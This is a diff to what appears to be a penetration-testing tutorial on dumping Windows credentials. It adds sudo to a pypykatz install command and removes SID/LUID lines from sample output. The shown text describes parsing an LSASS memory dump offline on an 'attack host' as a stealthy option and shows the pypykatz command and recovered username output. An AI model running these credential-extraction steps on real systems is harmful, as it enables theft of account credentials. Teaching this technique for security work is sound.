@@ -2034,7 +2034,7 @@ Once the dump file is transferred to our attack host, we can use a powerful tool
 ```bash
 git clone https://github.com/skelsec/pypykatz.git
 cd pypykatz
-python3 setup.py install
+sudo python3 setup.py install
 ```
 
 At the time of writing, Mimikatz only runs on Windows systems. This means we’d either need a Windows-based attack host or run Mimikatz directly on the target—an approach that carries greater risk. In contrast, pypykatz offers a more convenient and stealthy alternative, as it can be run offline on a Linux-based attack host using just a copy of the dump file.
@@ -2052,8 +2052,6 @@ pypykatz lsa minidump ./lsass.DMP
 MSV
 
 ```bash
-sid S-1-5-21-4019466498-1700476312-3544718034-1001
-luid 1354633
 	== MSV ==
 		Username: bob
 		Domain: DESKTOP-33E7O54
